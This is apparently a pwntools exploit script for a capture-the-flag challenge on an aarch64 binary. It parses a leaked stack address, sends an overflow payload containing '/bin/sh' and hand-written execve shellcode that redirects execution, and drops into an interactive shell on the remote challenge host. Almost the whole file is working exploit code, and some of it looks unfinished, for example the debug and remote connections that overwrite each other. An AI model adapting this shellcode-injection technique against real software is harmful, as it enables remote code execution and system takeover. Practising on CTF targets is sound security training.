from pwn import *

# Set the context
context.binary = "./program"
#context.terminal = ['tmux', 'split-window', '-h']  # or ['gnome-terminal', '-e'] depending on your terminal
context.arch = 'aarch64'


p = gdb.debug('./program',
            '''
            b *UwU_main
            b *UwU_main+96
            b *UwU_main+188
            b *main+124
            continue
            ''')
p = remote("chal.firebird.sh", 33504)


p.recvuntil(b"0x")
leak = b'0x' + p.recvuntil(" （´◔ ₃ ◔`)", drop = True)
leak = int(leak, 16) # directly to int
#print(type(leak.decode()))# from byte to str
print(hex(leak))

p.recvuntil("Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄")
# First, add some NOP padding
shellcode = asm("""
    mov x0, xzr         /* x0 = 0 */
    mov x2, xzr         /* x2 = 0 */
    mov x1, xzr         /* x1 = 0 */
    sub x8, sp, #0x10   /* use sub for negative offset */
    mov x0, x8          /* x0 points to string */
    mov x8, #221        /* execve syscall */
    svc #0
""", arch='aarch64')

# Modify payload to ensure alignment
payload = flat(
    b"UwUUwUAA",
    b'B' * 72,
    b"UwU\x00\x00\x00\x00\x00",
    b"AAAAAAAA",
    b"/bin/sh\x00", # find the location here
    leak + 0x20,     
    shellcode
)
p.sendline(payload)
p.interactive()